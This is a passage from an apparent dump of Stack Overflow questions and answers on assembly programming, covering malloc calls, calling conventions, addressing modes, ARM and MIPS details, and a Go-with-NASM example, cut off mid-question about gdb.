","<p>Probably because it's a jumping to a relative address, and the linker or loader has moved your code.  Try putting the address into a variable, and then do:</p>

<pre><code>jmp dword [var]
</code></pre>

<p>or alternatively:</p>

<pre><code>push 0xbffff994
ret
</code></pre>
","775124"
"What exactly does _malloc do in assembly?","10757","","<pre><code>public main
main proc near
push    ebp
mov     ebp, esp
and     esp, 0FFFFFFF0h
sub     esp, 30h
mov     dword ptr [esp], 8 ; size
call    _malloc
mov     [esp+2Ch], eax
mov     dword ptr [esp+4], 4
mov     eax, [esp+2Ch]
mov     [esp], eax
call    __start
</code></pre>

<p>The code above represents a portion of a large project I am working on. I am trying to reverse this code into C equivalent but I am having difficulty understanding how malloc works. </p>

<p>I am figuring 8 bytes would be the size of the memory being allocated; however, I am not sure about this line.</p>

<pre><code>mov      eax, [esp+2ch] 
</code></pre>

<p>What does malloc do to eax?</p>

<p>Furthermore would this be equivalent C code?</p>

<pre><code>int main(void)
{
int *ptr1;
ptr1 = (int *)malloc(sizeof(8));
*ptr1 = 4;
__start(*ptr1);
</code></pre>
","<p>The function malloc() will allocate a block of memory that is <code>size</code> bytes large. If the requested memory can be allocated a pointer is returned to the beginning of the memory block.</p>

<p>Note: the content of the received block of memory is not initialized.</p>

<p><strong>Syntax of malloc():</strong></p>

<p>void *malloc ( size_t size );</p>

<p><strong>Parameters:</strong></p>

<p>Size of the memory block in bytes.</p>

<p><strong>Return value:</strong></p>

<p>If the request is successful then a pointer to the memory block is returned.
If the function failed to allocate the requested block of memory, a NULL is returned, NULL may also be returned by a successful call to <code>malloc()</code> with a size of zero.</p>

<p>As stated in <a href=""http://www.cs.uaf.edu/2011/fall/cs301/lecture/10_03_pointers.html"" rel=""nofollow noreferrer"">this CS 301 lecture by Dr. Lawlor</a>:</p>

<blockquote>
  <p><strong>Calling Malloc from Assembly Language</strong></p>
  
  <p>It's a pretty straightforward function: pass the number of <em>BYTES</em> you
  want as the only parameter, in rdi.  ""call malloc.""  You'll get back a
  pointer to the allocated bytes returned in rax.  To clean up the space
  afterwards, copy the pointer over to rdi, and ""call free"" (I'm leaving
  off the free below, because you need the stack to do that properly).</p>
  
  <p>Here's a complete example of assembly memory access.  I call malloc to
  get 40 bytes of space.  malloc returns the starting address of this
  space in rax (the 64-bit version of eax).  That is, the rax register
  is acting like a pointer.  I can then read and write from the
  pointed-to memory using the usual assembly bracket syntax:</p>

<pre><code>mov edi, 40; malloc's first (and only) parameter: number of bytes to allocate
extern malloc
call malloc
; on return, rax points to our newly-allocated memory
mov ecx,7; set up a constant
mov [rax],ecx; write it into memory
mov edx,[rax]; read it back from memory
mov eax,edx; copy into return value register
ret
</code></pre>
  
  <p>Rather than copy via the ecx register, you can specify you want a
  32-bit memory write and read using ""DWORD"" in front of the brackets,
  like this:</p>

<pre><code>mov edi, 40; malloc's first (and only) parameter: number of bytes to allocate
extern malloc
call malloc
; on return, rax points to our newly-allocated memory
mov DWORD [rax],7; write constant into memory
mov eax,DWORD [rax]; read it back from memory
ret
</code></pre>
</blockquote>

<p>for malloc in assembly language..see this link <a href=""http://www.cs.uaf.edu/2010/fall/cs301/lecture/10_04_malloc.html"" rel=""nofollow noreferrer"">malloc</a></p>
","20510345"
"assembly program to find the smallest among two numbers","10754","","<p>how do i assembly program to find the smallest among two numbers.</p>

<p>assuming that 
first number is located a memory address : 0x2001
second number is located a memory address : 0x2002</p>

<p>store the smaller number in Accumulator </p>

<p>Here is what i attempted :</p>

<pre><code>LDA 0x2001
MOV B, A
LDA 0x2002
CMP B
JNC smaller
exit
smaller :
MOV A, B
exit : HLT
</code></pre>

<p>is my solution correct?</p>
","<pre><code>XRA             ; clear the accumulator
MVI B, 30H      ; load a number to B Register
MVI C, 40H      ; load a number to C Register
MOV A, B        ; Move the content of B to A
CMP C           ; Compare value of C against A
JNC SMALL       ; Jump if smaller
**JMP END**         ; Halt program if not small
SMALL: MOV A, C ; save smaller num in accumulator
**END: HLT**
</code></pre>
","13978140"
"Why pop takes a parameter in assembly?","10750","","<pre><code>popl   %ebp
</code></pre>

<p>It seems the <code>%ebp</code> is unnecessary because the <code>pop</code> operation of stack doesn't need a parameter.</p>

<p>Why does it make sense?</p>
","<p>From <a href=""http://www.cs.virginia.edu/~evans/cs216/guides/x86.html"" rel=""noreferrer"">http://www.cs.virginia.edu/~evans/cs216/guides/x86.html</a></p>

<blockquote>
  <p><strong>pop</strong> — Pop stack</p>
  
  <p>The pop instruction removes the 4-byte data element from the top of the hardware-supported stack into the specified operand (i.e. register or memory location). It first moves the 4 bytes located at memory location [SP] into the specified register or memory location, and then increments SP by 4.</p>
  
  <p><em>Syntax</em><br>
  pop &lt;reg32&gt;<br>
  pop &lt;mem&gt;</p>
  
  <p><em>Examples</em><br>
  pop edi — pop the top element of the stack into EDI.<br>
  pop [ebx] — pop the top element of the stack into memory at the four bytes starting at location EBX.</p>
</blockquote>

<p>Another good reference is <a href=""http://en.wikibooks.org/wiki/X86_Assembly"" rel=""noreferrer"">http://en.wikibooks.org/wiki/X86_Assembly</a> and it is available in <a href=""http://upload.wikimedia.org/wikibooks/en/1/11/X86_Assembly.pdf"" rel=""noreferrer"">PDF form</a>.</p>
","2554317"
"What is a code cave, and is there any legitimate use for one?","10734","","<p>I encountered this word for the first time in the StackOverflow question ""<a href=""https://stackoverflow.com/questions/787006/"">C# Theoretical: Write a JMP to a codecave in asm</a>.""  I see that according to <a href=""http://en.wiktionary.org/wiki/code_cave"" rel=""nofollow noreferrer"">Wiktionary</a>, a code cave is:</p>

<blockquote>
  <p>an unused block of memory that someone, typically a software cracker, can use to inject
  custom programming code to modify the behavior of a program.</p>
</blockquote>

<p>Did I find the correct definition?  If so, is there any legitimate use for a code cave?</p>
","<p>I've used them, although I'd never heard the term <em>code cave</em> until today. The Wiktionary definition suggests that a code cave is something the cracker finds in the executable he or she is attempting to crack. The question you cite doesn't use it that way. Instead, it suggests the code cave is being allocated with <code>VirtualAllocEx</code> to create a brand new block of memory in the target process. That removes the need to search for unused space in the target, and it guarantees you'll have enough space to put all your new code.</p>

<p>Ultimately, I think <strong>a ""code cave"" is just a place to store run-time-generated code</strong>. There doesn't have to be any nefarious purpose to that code. And at that point, the question of what a code cave is becomes entirely uninteresting. The interesting parts are what reasons there are for generating code at run time, and what techniques there are for making sure that new code gets run when you want it.</p>
","787294"
"'align' instruction on MIPS","10724","","<p>What exactly does this instruction do? I know that it tries to align data with a multiple of a specific number but why would you need to do this? Is there an equivalent instruction in other assemblers?</p>
","<p>You usually align data to get better performance. For most processors, memory access has some penalty when not accessing specific byte boundaries. For other assemblers, there often is some kind of <a href=""http://www.nersc.gov/vendor_docs/ibm/asm/align.htm"" rel=""noreferrer"">pseudo-op</a> <code>.align</code> for this. Most compilers also align their data structures (though you can disable it for debug purposes).</p>

<p>Also See this <a href=""http://en.wikipedia.org/wiki/Packed"" rel=""noreferrer"">Wikipedia entry</a>.</p>

<p>Note that non-emulated MIPS systems might even crash if you try to access unaligned memory cells (see <a href=""http://en.wikibooks.org/wiki/MIPS_Assembly/MIPS_Instructions"" rel=""noreferrer"">here</a> and <a href=""http://gcc.gnu.org/ml/gcc/2006-05/msg00122.html"" rel=""noreferrer"">here</a>).</p>
","1021072"
"Reading from a file in assembly","10721","","<p>I'm trying to learn assembly -- x86 in a Linux environment.  The most useful tutorial I can find is <a href=""http://leto.net/writing/nasm.php"" rel=""nofollow noreferrer"">Writing A Useful Program With NASM</a>.  The task I'm setting myself is simple: read a file and write it to stdout.</p>

<p>This is what I have:</p>

<pre><code>section  .text              ; declaring our .text segment
  global  _start            ; telling where program execution should start

_start:                     ; this is where code starts getting exec'ed

  ; get the filename in ebx
    pop   ebx               ; argc
    pop   ebx               ; argv[0]
    pop   ebx               ; the first real arg, a filename

  ; open the file
    mov   eax,  5           ; open(
    mov   ecx,  0           ;   read-only mode
    int   80h               ; );

  ; read the file
    mov     eax,  3         ; read(
    mov     ebx,  eax       ;   file_descriptor,
    mov     ecx,  buf       ;   *buf,
    mov     edx,  bufsize   ;   *bufsize
    int     80h             ; );

  ; write to STDOUT
    mov     eax,  4         ; write(
    mov     ebx,  1         ;   STDOUT,
  ; mov     ecx,  buf       ;   *buf
    int     80h             ; );

  ; exit
    mov   eax,  1           ; exit(
    mov   ebx,  0           ;   0
    int   80h               ; );
</code></pre>

<p>A crucial problem here is that the tutorial never mentions how to create a buffer, the <code>bufsize</code> variable, or indeed variables at all.</p>

<p>How do I do this?</p>

<p>(An aside: after at least an hour of searching, I'm vaguely appalled at the low quality of resources for learning assembly.  How on earth does any computer run when the only documentation is the hearsay traded on the 'net?)</p>
","<p>you must declare your buffer in bss section and the bufsize in data</p>

<pre><code>section .data
   bufsize dw      1024

section .bss
   buf     resb    1024
</code></pre>
","4736323"
"How can I create a sleep function in 16bit MASM Assembly x86?","10701","","<p>I am trying to create a sleep/delay procedure in 16bit MASM Assembly x86 that will, say, print a character on the screen every 500ms.
From the research I have done, it seems that there are three methods to achieve this - I would like to use the one that uses CPU clock ticks.</p>

<p>Please note I am running Windows XP through VMWare Fusion on Mac OS X Snow Leopard - I am not sure if that affects anything.</p>

<p>Could someone please point me in the right direction, or provide a working piece of code I can tweak? Thank you!</p>

<p>The code I have found is supposed to print 'A' on the screen every second, but does not work (I'd like to use milliseconds anyways).</p>

<pre><code>TOP:
MOV AH,2C
INT 21
MOV BH,DH  ; DH has current second
GETSEC:      ; Loops until the current second is not equal to the last, in BH
MOV AH,2C
INT 21
CMP BH,DH  ; Here is the comparison to exit the loop and print 'A'
JNE PRINTA
JMP GETSEC
PRINTA:
MOV AH,02
MOV DL,41
INT 21
JMP TOP
</code></pre>

<p><strong>EDIT: Following GJ's advice, here's a working procedure. Just call it</strong></p>

<pre><code>DELAY PROC
 TIMER:
 MOV     AH, 00H
 INT     1AH
 CMP     DX,WAIT_TIME
 JB      TIMER
 ADD     DX,3         ;1-18, where smaller is faster and 18 is close to 1 second
 MOV     WAIT_TIME,DX
 RET
DELAY ENDP
</code></pre>
","<p>Actually you can use ROM BIOS interrupt 1Ah function 00h, 'Read Current Clock Count'. Or you can read dword at address $40:$6C but you must ensure atomic read. It is incremented by MS-DOS at about 18.2 Hz. </p>

<p>For more information read: <a href=""https://web.archive.org/web/20100715145540/http://www.merlyn.demon.co.uk/pas-time.htm#L46C"" rel=""nofollow noreferrer"">The DOS Clock</a></p>
","1862232"
"Understanding the purpose of some assembly statements","10669","","<p>I am trying to understand some assembly code and managed to finish most of it except a few lines. I am able to understand most of what is happening inside but am not able to fully understand what (and why it) is happening at the beginning and ending of the code. Can someone shed some light on this?</p>

<pre><code>int main() {
    int a, b;
    a = 12;
    b = 20;
    b = a + 123;
    return 0;
}
</code></pre>

<p>Disassembled Version:</p>

<pre><code> 8048394:8d 4c 24 04          lea    0x4(%esp),%ecx              ; ??
 8048398:83 e4 f0             and    $0xfffffff0,%esp            ; ??
 804839b:ff 71 fc             pushl  -0x4(%ecx)                  ; ??
 804839e:55                   push   %ebp                        ; Store the Base pointer
 804839f:89 e5                mov    %esp,%ebp                   ; Initialize the Base pointer with the stack pointer
 80483a1:51                   push   %ecx                        ; ??
 80483a2:83 ec 4c             sub    $0x4c,%esp                  ; ??
 80483a5:c7 45 f8 0c 00 00 00 movl   $0xc,-0x8(%ebp)             ; Move 12 into -0x8(%ebp)
 80483ac:c7 45 f4 14 00 00 00 movl   $0x14,-0xc(%ebp)            ; Move 20 into -0xc(%ebp)
 80483b3:8b 45 f8             mov    -0x8(%ebp),%eax             ; Move 12@-0x8(%ebp) into eax
 80483b6:83 c0 7b             add    $0x7b,%eax                  ; Add 123 to 12@eax
 80483b9:89 45 f4             mov    %eax,-0xc(%ebp)             ; Store the result into b@-0xc(%ebp)
 80483bc:b8 00 00 00 00       mov    $0x0,%eax                   ; Move 0 into eax
 80483c1:83 c4 10             add    $0x10,%esp                  ; ??
 80483c4:59                   pop    %ecx                        ; ??
 80483c5:5d                   pop    %ebp                        ; ??
 80483c6:8d 61 fc             lea    -0x4(%ecx),%esp             ; ??
</code></pre>
","<p>The stack grows <strong>downward</strong>.  A <code>push</code> subtracts from the stack pointer (esp) and a <code>pop</code> adds to esp.  You have to keep that in mind to understand a lot of this.</p>

<pre><code>8048394:8d 4c 24 04          lea    0x4(%esp),%ecx              ; ??
</code></pre>

<p>lea = Load Effective Address</p>

<p>This saves the address of the thing that lies 4 bytes into the stack.  Since this is 32 bit (4 byte word) x86 code that means the second item on the stack.  Since this is the code of a function (main in this case) the 4 bytes that are at the top of the stack is the return address.</p>

<pre><code>8048398:83 e4 f0             and    $0xfffffff0,%esp            ; ??
</code></pre>

<p>This code makes sure that the stack is aligned to 16 bytes.  After this operation esp will be less than or equal to what it was before this operation, so the stack may grow, which protects anything that might already be on the stack.  This is sometimes done in <code>main</code> just in case the function is called with an unaligned stack, which can cause things to be really slow (16 byte is a cache line width on x86, I think, though 4 byte alignment is what is really important here).  If main has a unaligned stack the rest of the program will too.</p>

<pre><code> 804839b:ff 71 fc             pushl  -0x4(%ecx)                  ; ??
</code></pre>

<p>Since ecx was loaded before as a pointer to the thing on the other side of the return address from the previous top of the stack, so since this has a -4 index this refers to back to the return address for the current function being pushed back to the top of the stack so that main can return normally.  (Push is magic and seems to be able to both load and store from to different places in RAM in the same instruction).</p>

<pre><code> 804839e:55                   push   %ebp                        ; Store the Base pointer
 804839f:89 e5                mov    %esp,%ebp                   ; Initialize the Base pointer with the stack pointer
 80483a1:51                   push   %ecx                        ; ??
 80483a2:83 ec 4c             sub    $0x4c,%esp                  ; ??
</code></pre>

<p>This is mostly the standard function prologue (the previous stuff was special for main).  This is making a stack frame (area between ebp and esp) where local variables can live.  ebp is pushed so that the old stack frame can be restored in the epilogue (at the end of the current function).</p>

<pre><code>80483a5:c7 45 f8 0c 00 00 00 movl   $0xc,-0x8(%ebp)             ; Move 12 into -0x8(%ebp)
80483ac:c7 45 f4 14 00 00 00 movl   $0x14,-0xc(%ebp)            ; Move 20 into -0xc(%ebp)
80483b3:8b 45 f8             mov    -0x8(%ebp),%eax             ; Move 12@-0x8(%ebp) into eax
80483b6:83 c0 7b             add    $0x7b,%eax                  ; Add 123 to 12@eax
80483b9:89 45 f4             mov    %eax,-0xc(%ebp)             ; Store the result into b@-0xc(%ebp)

80483bc:b8 00 00 00 00       mov    $0x0,%eax                   ; Move 0 into eax
</code></pre>

<p>eax is where integer function return values are stored.  This is setting up to return 0 from main.</p>

<pre><code>80483c1:83 c4 10             add    $0x10,%esp                  ; ??
80483c4:59                   pop    %ecx                        ; ??
80483c5:5d                   pop    %ebp                        ; ??
80483c6:8d 61 fc             lea    -0x4(%ecx),%esp             ; ??
</code></pre>

<p>This is the function epilogue.  It is more difficult to understand because of the weird stack alignment code at the beginning.  I'm having a little bit of trouble figuring out why the stack is being adjusted by a lower amount this time than in the prologue, though.</p>

<p>It if obvious that this particular code was not compiled with optimizations on.  If it were there probably wouldn't be much there since the compiler can see that even if it did not do the math listed in your <code>main</code> the end result of the program is the same.  With programs that do actually do something (have side effects or results) it sometimes easier to read lightly optimized code (-O1 or -0s arguments to gcc).</p>

<p>Reading assembly generated by a compiler is often much easier for functions that aren't <code>main</code>.  If you want to read to understand the code then write yourself a function that takes some arguments to produce a result or that works on global variables, and you will be able to understand it better.</p>

<p>Another thing that will probably help you is to just have gcc generate the assembly files for you, rather than disassembling them.  The <code>-S</code> flag tells it to generate this (but not to generate other files), and names the assembly files with a <code>.s</code> on the end.  This should be easier for you to read than the disassembled versions.</p>
","4228936"
"assembly lang 8085 .. how to find even/odd parity","10648","","<p>I have the following code to count the number of 1s and save it to reg B. I need to modify it to find if the parity is even or odd... </p>

<pre><code>LXI H, var1
MVI B, 00H
MVI D, 00H
MVI C, 08H
MOV A, M

LOOP: RAR
JNC SKIP
INR B
SKIP: DCR C
JNZ LOOP

HLT

var1: db 72
</code></pre>
","<p>An even parity means that there's an even number of bits set in an octet. According to this brief introduction to <a href=""http://www.cpu-world.com/Arch/8085.html"" rel=""nofollow"">Intel 8085 architecture</a>:</p>

<blockquote>
  <p>Flag is an 8-bit register containing 5 1-bit flags:<br>
   - Sign - set if the most significant bit of the result is set.<br>
   - Zero - set if the result is zero.<br>
   - Auxiliary carry - set if there was a carry out from bit 3 to bit 4 of the result.<br>
   - <strong><em>Parity</em></strong> - set if the parity (the number of set bits in the result) is even.<br>
   - Carry - set if there was a carry during addition, or borrow during subtraction/comparison.  </p>
</blockquote>

<p>The parity flag can be most easily tested with conditional branches (<a href=""http://engeletrica.sobral.ufc.br/professores/marcelo/Micro/8085_is_details.pdf"" rel=""nofollow"">link to source</a>)</p>

<pre><code>JPE label;   // Jump if parity is Even 
JPO label;   // or jump if parity is Odd
</code></pre>

<p>The flag is set by most arithmetic and logical instructions that deal with a single output registers. Counter-examples are <em>MOV</em>, and <em>CMP</em>, which doesn't store a result. Arithmetic operations (<em>INX</em>, <em>DEX</em> etc.) that modify a register pair in turn do not have an unambiguous result.</p>
","15458554"
"ARM-Assembly: Arithmetic Shift / Logical Shift","10640","","<p>I'm a bit stuck finding out in which way those 2 operations are different. So I read that Arithmetic shift is basically the same as Logical with the only difference, that it somehow keeps the highest or signed bit.</p>

<p>So when I do LSL #2 on 101110 assuming that this binary is a unsigned one, the result would be: 111000 and the carry bit would be set in the CPSR, right?</p>

<p>When I perform ASL #2 on the same number, what would be the result and how does it keep the signed bit? What about ASR #2 on the above binary? Would the result be 101011?</p>

<p>Unfortunately I've only found a really rough description about Arithmetic shift. Thanks in advance!</p>
","<p>Your examples don't make much sense since your numbers are 6bit only so 31st bit will always be <code>0</code>.</p>

<p><code>ASL</code> is a synonym for <code>LSL</code> and you can see shift operations behaviour in <a href=""http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.dui0497a/CIHDDCIF.html"" rel=""nofollow"">official ARM documentation</a> or this <a href=""http://www.peter-cockerell.net/aalp/html/ch-3.html"" rel=""nofollow"">ARM reference site</a>.</p>
","14565741"
"Is it possible to include inline assembly in Google Go code?","10629","","<p>Is it possible to include inline assembly in Google Go code?</p>
","<p>There is no support for inline assembly, but you can link with code written in assembly through C, compiling with cgo and using <code>import ""C""</code>, like in <a href=""http://code.google.com/p/go/source/browse/misc/cgo/gmp/gmp.go?r=release"" rel=""noreferrer"">gmp.go</a>. You could alternatively write in a style of assembly that is directly compatible with Go, like in <a href=""http://golang.org/src/pkg/syscall/asm_linux_amd64.s"" rel=""noreferrer"">asm_linux_amd64.s</a>, that requires that function names start with ""·"".</p>

<p>Or, you can use nasm and gccgo, my favorite way so far. (Note that Nasm does not seem to support functions starting with ""·"").</p>

<p>Here's a working ""hello world"" example:</p>

<p>hello.asm:</p>

<pre><code>; Based on hello.asm from nasm

    SECTION .data       ; data section
msg:    db ""Hello World"",10 ; the string to print, 10=cr
len:    equ $-msg       ; ""$"" means ""here""
                ; len is a value, not an address

    SECTION .text       ; code section

global go.main.hello        ; make label available to linker (Go)
go.main.hello:

    ; --- setup stack frame
    push rbp            ; save old base pointer
    mov rbp,rsp   ; use stack pointer as new base pointer

    ; --- print message
    mov edx,len     ; arg3, length of string to print
    mov ecx,msg     ; arg2, pointer to string
    mov ebx,1       ; arg1, where to write, screen
    mov eax,4       ; write sysout command to int 80 hex
    int 0x80        ; interrupt 80 hex, call kernel

    ; --- takedown stack frame
    mov rsp,rbp  ; use base pointer as new stack pointer
    pop rbp      ; get the old base pointer

    ; --- return
    mov rax,0       ; error code 0, normal, no error
    ret         ; return
</code></pre>

<p>main.go:</p>

<pre><code>package main

func hello();

func main() {
    hello()
    hello()
}
</code></pre>

<p>And a handy Makefile:</p>

<pre><code>main: main.go hello.o
    gccgo hello.o main.go -o main

hello.o: hello.asm
    nasm -f elf64 -o hello.o hello.asm

clean:
    rm -rf _obj *.o *~ *.6 *.gch a.out main
</code></pre>

<p>I call <code>hello()</code> twice in main.go, just to double check that hello() returns properly.</p>

<p>Note that calling interrupt 80h directly is not considered good style on Linux, and calling functions written is C is more ""future proof"". Also note that this is assembly specifically for 64-bit Linux, and is not platform-independent in any way, shape or form.</p>

<p>I know it's not a direct answer to your question, but it's the easiest route I know for using assembly with Go, in lack of inlining. If you really need inlining, it's possible to write a script that extracts inline assembly from source files and prepares it in a way that follows the pattern above. Close enough? :)</p>

<p>Quick example for Go, C and Nasm: <a href=""http://roboticoverlords.org/gonasm/gonasm.tgz"" rel=""noreferrer"">gonasm.tgz</a></p>

<p><strong>Update:</strong> Later versions of gccgo needs the -g flag and only ""main.hello"" is needed instead of ""go.main.hello"". Here is an updated example for Go, C and Yasm: <a href=""http://roboticoverlords.org/gonasm/goyasm.tgz"" rel=""noreferrer"">goyasm.tgz</a></p>
","6535590"
"C to assembly call convention 32bit vs 64bit","10620","","<p>I have been following the excellent book Programming Ground Up, wanting to learn assembly. Although not in the book at this point, I wanted to call my assembly function from C. on a 32 bit machine, this works as is when working from the book.</p>

<p>What I do here is storing the first argument in <code>%ebx</code> and the second in <code>%ecx</code>.</p>

<pre><code>.type power, @function
.globl power
power:
    pushq   %ebp
    movl    %esp, %ebp
    subl    $4, %esp

    movl    8(%ebp), %ebx
    movl    12(%ebp), %ecx
</code></pre>

<p>I compile this (and the rest of the function) into an object file, create a main.c, where I prototype the function and call it, something like this:</p>

<pre><code>int power(int b, int x);
int a = power(2, 1);
</code></pre>

<p>However, when I compile this on a 64 bit machine, I get some very unexpected results. I modified the obvious, like the fact that <code>%esp</code> and <code>%epb</code> needs to be replaced with <code>%rsp</code> and <code>%rpb</code>, but digging with GDB reveals that the arguments are nowhere to be found on the stack!</p>

<p>Checking out what happens by using the <code>-S</code> option to GCC I can see that instead of pushing the variables on the stack, GCC stores the arguments in registers.</p>

<pre><code> movl $1, %esi
 movl $2, %edi
 call power
</code></pre>

<p>On the 32 bit machine, it does what I expect and push the arguments on the stack:</p>

<pre><code> movl $1, 4(%esp)
 movl $2, (%esp)
 call power
</code></pre>

<p>Now what is going on here? Why does GCC pass the arguments in registers on 64 bit and on the stack on 32 bit? This is very confusing! And I can't find any mention on this anywhere. Is there anyone who can enlighten me on this situation?</p>
","<p>64-bit C calling convention is: %rdi, %rsi, %rdx, %rcx, %r8 and %r9</p>

<p>See full description here:
<a href=""https://web-beta.archive.org/web/20160315222117/http://www.x86-64.org/documentation_folder/abi.pdf"" rel=""nofollow noreferrer"">""System V Application Binary Interface: AMD64 Architecture Processor Supplement"" http://www.x86-64.org/documentation/abi.pdf</a></p>

<p>3.2 Function Calling Sequence</p>

<p>When I learned the same topic, I made small C programs with required functions, compiled them in 64 bit compiler and read the Assembly code produced by C compiler. C/C++ compiler can be used like kind of Assembly reference.</p>
","4266083"
"internal relocation not fixed up","10602","","<p>i recently started assembler programming for arm cores. My first little demos, only with the .text section, ran without any problems. </p>

<p>As a logical extension i wanted to structure the assembler code into the usual sections: .text, .data, .bss .</p>

<p>So i wrote the following simple program:</p>

<pre><code> .globl _start

 .section .text

 _start:
     b   main
     b   .
     b   .
     b   .
     b   .
     b   .
     b   .
     b   .  


 main:
    ldr r0, x
    nop

 .section .data

 x:  .word  0xf0f0f0f0

 .end
</code></pre>

<p>But </p>

<pre><code>  /opt/arm/bin/arm-as -ggdb -mcpu=arm7tdmi demo.s -o demo.o
</code></pre>

<p>exits with the error</p>

<pre><code> prog.s: Assembler messages:
 prog.s:17: Error: internal_relocation (type: OFFSET_IMM) not fixed up
 make: *** [prog.o] Error 1
</code></pre>

<p>I have no clue why the assembler complains about relocation, because i thought that's the task of the linker. I could imagine that i have to tell the assembler that my .data section isn't located at the final memory postion at the assembling stage, but i can't find anything related. </p>

<p>Although i found a way to get the code assembled correctly, by replacing</p>

<pre><code> .section .data
</code></pre>

<p>by</p>

<pre><code> .org .
</code></pre>

<p>that is not a satisfying solution. Especially in view of the fact that the gas documentation highlight the sense of this section.</p>

<p>Maybe someone of you experts can help me to gain some wisdom</p>
","<p>It seems the only way you can do it is by grabbing the address of the variable and load a value from that address.</p>

<pre><code>ldr r1,=x    ; get address of x
ldr r0,[r1]  ; load from that address
</code></pre>

<p>In a way, this also kind of makes sense. After all, what if the address of x (after linking) is too far away for a PC relative access? Since the compiler (which doesn't do the linking) does not know how far away the data section may be from the text section, it would refuse to compile that code just in case it isn't reachable. </p>

<p>By using this indirect way of accessing a variable, it is guaranteed that the variable will be reachable (or at least the compiler can be sure whether the variable is reachable or not).</p>

<p>Code adapted from <a href=""http://www.zap.org.au/elec2041-cdrom/examples/intro/pseudo.s"" rel=""noreferrer"">http://www.zap.org.au/elec2041-cdrom/examples/intro/pseudo.s</a></p>
","10171869"
"Addressing Modes in Assembly Language (IA-32 NASM)","10597","","<p>As the web-resources on this is sparse, I will, for the benefit of future searches, begin by listing the address modes for IA-32 Assembly Language (NASM) and then follow up with a quick question.</p>

<ol>
<li>Register addressing
<ul>
<li>mov eax, ebx: Copies what is in ebx into eax</li>
<li>mov esi, var: Copies address of var (say 0x0040120e) into esi</li>
</ul></li>
<li>Immediate addressing (second operand is an immediate constant)
<ul>
<li>mov bx, 20: 16-bit register bx gets the actual value 20</li>
</ul></li>
<li>Direct memory addressing (directly loads from memory through a specified address)
<ul>
<li>mov ax, [1000h]: loads a 2-byte object from the byte at address 4096 (0x1000 in hexadecimal) into a 16-bit register called 'ax'</li>
<li>mov [1000h], ax: memory at address 1000h gets the value of ax</li>
</ul></li>
<li>Direct offset addressing (same as 3, just using arithmetics to modify address)
<ul>
<li>mov al, [byte_tbl+2]</li>
</ul></li>
<li>Register indirect (accessing memory by using addresses stored in registers)
<ul>
<li>mov ax, [di]: copies value at memory address specified by di, into ax</li>
<li>mov dword [eax], var1: copies value in var1 into the memory slot specified by eax</li>
</ul></li>
</ol>

<p>Please note that the above is for NASM. For MASM/TASM you'd use ""mov esi, OFFSET foo"" to get the address, while ""mov esi, foo"" and ""mov esi, [foo]"" both would get the value (creds to @Michael).</p>

<p>So, onto my question. It is in in relation to an example at the bottom of page 29 of the following tutorial: <a href=""http://www.tutorialspoint.com/assembly_programming/assembly_tutorial.pdf"">http://www.tutorialspoint.com/assembly_programming/assembly_tutorial.pdf</a></p>

<p>It basically lists the below code as an example of indirect memory addressing.</p>

<pre><code>MY_TABLE TIMES 10 DW 0 ; Allocates 10 words (2 bytes) each initialized to 0 
MOV EBX, [MY_TABLE] ; Effective Address of MY_TABLE in EBX 
MOV [EBX], 110 ; MY_TABLE[0] = 110 
ADD EBX, 2 ; EBX = EBX +2 
MOV [EBX], 123 ; MY_TABLE[1] = 123 
</code></pre>

<p><strong>My questions:</strong></p>

<ol>
<li>Should not ""MOV EBX, [MY_TABLE]"" in fact be ""MOV EBX, MY_TABLE"", as we want to put the address of the table in EBX, not the value itself?</li>
<li>Surely it is MY_TABLE[2] that is equal to 123 at the end, not MY_TABLE[1]?</li>
</ol>
","<ol>
<li><p>In NASM syntax, that instruction should be <code>MOV EBX, MY_TABLE</code>. What <code>MOV EBX, [MY_TABLE]</code> would do is load the first 4 bytes located at <code>MY_TABLE</code> into <code>EBX</code>. Another alternative would be to use <a href=""http://x86.renejeschke.de/html/file_module_x86_id_153.html"" rel=""noreferrer""><code>LEA</code></a>, as in <code>LEA EBX, [MY_TABLE]</code>.</p></li>
<li><p>In this case the tutorial is right. <code>MY_TABLE</code> is defined as an array of words. A word on the x86 is 2 bytes, so the second element of <code>MY_TABLE</code> is indeed located at <code>MY_TABLE + 2</code>.</p></li>
</ol>
","20609569"
"MIPS: Copy address of register to another register","10587","","<p>So I'm having trouble copying the address of a register to another register. Currently I'm doing this:</p>

<pre><code>la $a2, $a0
</code></pre>

<p>And I'm getting a syntax error. Does anyone know what's going on?</p>
","<p>In order to treat the contents of $ao as an address rather than a number, put it into () like this:</p>

<pre><code>la $a2, ($a0)
</code></pre>

<p>You could also use the move instruction:</p>

<pre><code>move $a2, $a0
</code></pre>

<p>Kevin</p>
","14994091"
"What does gdb 'x' command do?","10557","","<p>I am reading a <a href=""http://rads.stackoverflow.com/amzn/click/1593271441"">book</a> about hacking and it has a chapter about assembly.</p>

<p>Following is my tiny program written in C.</p>

<pre><code>#include &lt;stdio.h&gt;

int main(int argc, char const *argv[])
{
    int i;

    for (i = 0; i &lt; 10; i++) {
        puts(""Hello World!"");
    }

    return 0;
}
</code></pre>

<p>And the following is <code>gdb</code> test:</p>

<pre><code>(gdb) break main
Breakpoint 1 at 0x40050f: file main.c, line 7.
(gdb) run
Breakpoint 1, main (argc=1, argv=0x7fffffffe708) at main.c:7
7       for (i = 0; i &lt; 10; i++) {
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000000000400500 &lt;+0&gt;: push   rbp
   0x0000000000400501 &lt;+1&gt;: mov    rbp,rsp
   0x0000000000400504 &lt;+4&gt;: sub    rsp,0x20
   0x0000000000400508 &lt;+8&gt;: mov    DWORD PTR [rbp-0x14],edi
   0x000000000040050b &lt;+11&gt;:    mov    QWORD PTR [rbp-0x20],rsi
=&gt; 0x000000000040050f &lt;+15&gt;:    mov    DWORD PTR [rbp-0x4],0x0
   0x0000000000400516 &lt;+22&gt;:    jmp    0x400526 &lt;main+38&gt;
   0x0000000000400518 &lt;+24&gt;:    mov    edi,0x4005c4
   0x000000000040051d &lt;+29&gt;:    call   0x4003e0 &lt;puts@plt&gt;
   0x0000000000400522 &lt;+34&gt;:    add    DWORD PTR [rbp-0x4],0x1
   0x0000000000400526 &lt;+38&gt;:    cmp    DWORD PTR [rbp-0x4],0x9
   0x000000000040052a &lt;+42&gt;:    jle    0x400518 &lt;main+24&gt;
   0x000000000040052c &lt;+44&gt;:    mov    eax,0x0
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
   0x0000000000400531 &lt;+49&gt;:    leave  
   0x0000000000400532 &lt;+50&gt;:    ret    
